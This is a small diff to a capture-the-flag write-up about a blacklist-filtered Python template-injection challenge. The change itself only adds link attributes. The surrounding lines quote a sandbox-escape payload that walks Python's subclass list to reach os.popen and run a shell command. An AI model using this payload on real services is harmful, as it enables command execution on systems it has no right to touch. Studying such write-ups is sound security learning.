@@ -52,7 +52,7 @@ Some blacklisted items here but its essentially a SSTI sort of. I tried a basic 
 
 ![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/da577c04-8ffc-4092-8475-3b53734cf0d2)
 
-4th last item is my [favourite](https://blog.p6.is/Python-SSTI-exploitable-classes/#Using-os-wrap-close).
+4th last item is my [favourite](https://blog.p6.is/Python-SSTI-exploitable-classes/#Using-os-wrap-close){:target="_blank" rel="noopener"}.
 
 `print(''.__class__.__mro__[1].__subclasses__()[-4].__init__.__globals__['sys'].modules['os'].popen('ls').read())`
 
